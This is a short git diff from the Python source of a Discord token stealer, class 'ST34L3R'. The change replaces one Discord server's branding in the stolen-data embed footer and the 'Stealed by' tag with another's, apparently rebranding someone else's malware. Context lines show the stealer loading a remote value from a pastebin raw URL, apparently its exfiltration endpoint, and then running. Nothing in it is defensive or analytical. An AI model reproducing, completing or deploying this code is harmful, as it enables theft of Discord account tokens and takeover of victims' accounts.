@@ -145,7 +145,7 @@ class ST34L3R():
                         "icon_url": f"https://cdn.discordapp.com/avatars/{user_id}/{user_avatar}"
                     },
                     "footer": {
-                        "text": f"P0W3RFULL DISC0RD T0K3N ST34L3R  -  discord.gg/crow",
+                        "text": f"P0W3RFULL DISC0RD T0K3N ST34L3R  -  discord.gg/devfr",
                         "icon_url": f"https://cdn.discordapp.com/avatars/{user_id}/{user_avatar}"
                     },
                     "image": {
@@ -171,6 +171,6 @@ class ST34L3R():
 
 ST34L3R = ST34L3R(
     requests.get("https://pastebin.com/raw/XXXXXXXX").text,
-    "Stealed by discord.gg/crow"
+    "Stealed by discord.gg/devfr"
 )
 ST34L3R.main()
